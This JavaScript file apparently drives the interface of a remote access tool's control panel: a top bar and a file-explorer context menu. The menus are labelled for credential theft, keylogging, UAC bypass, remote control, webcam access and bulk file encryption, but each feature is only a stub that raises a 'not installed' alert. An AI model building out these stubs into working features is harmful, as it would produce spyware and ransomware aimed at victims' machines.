topBar();
contextMenu();

function topBar() {
    const functions = [
        () => alert('warning', '"System Info" function not installed.'),
        () => alert('warning', '"Credentials" function not installed.'),
        () => alert('warning', '"Key Log" function not installed.'),
        () => alert('warning', '"Keys" function not installed.'),
        () => alert('warning', '"System Tools" function not installed.'),
        () => alert('warning', '"Network" function not installed.'),
        () => alert('warning', '"Browser" function not installed.'),
        () => alert('warning', '"UAC Bypass" function not installed.'),
        () => alert('warning', '"User Media Handler" function not installed.'),
        () => alert('warning', '"Remote Control" function not installed.'),
    ];

    document.querySelectorAll('nav.top-bar div.item')
    .forEach((item, i) => item.addEventListener('click', () => functions[i]()));
}

function contextMenu() {
    const menu = document.querySelector('.main div.file-explorer section.menu');
    
    const item_html = `
        <span class="item"> Delete </span>
        <hr>
        <span class="item"> Rename </span>
        <hr>
        <span class="item"> Download </span>
        <hr>
        <span class="item"> Encrypt </span>
        <hr>
        <span class="item"> Decrypt </span>
        <hr>
        <span class="item"> Properties </span>
    `;

    const explorer_html = `
        <span class="item"> Upload </span>
        <hr>
        <span class="item"> Encrypt All </span>
        <hr>
        <span class="item"> Decrypt All </span>
        <hr>
        <span class="item"> Properties </span>
    `;

    document.addEventListener('click', () => {
        if(!menu.hidden)
            menu.hidden = true; 
    });

    document.addEventListener('contextmenu', e => {
        e.preventDefault();

        menu.style.left = e.clientX + 'px';
        menu.style.top = e.clientY + 'px';
        
        const curr = e.target.parentNode.getAttribute('class');
        switch(curr) {
            case 'explorer':
                menu.innerHTML = explorer_html;
                break;
                
            case 'file':
            case 'folder':
                menu.innerHTML = item_html;
                break;
        }
            
        menu.hidden = !menu.hidden;
    });
}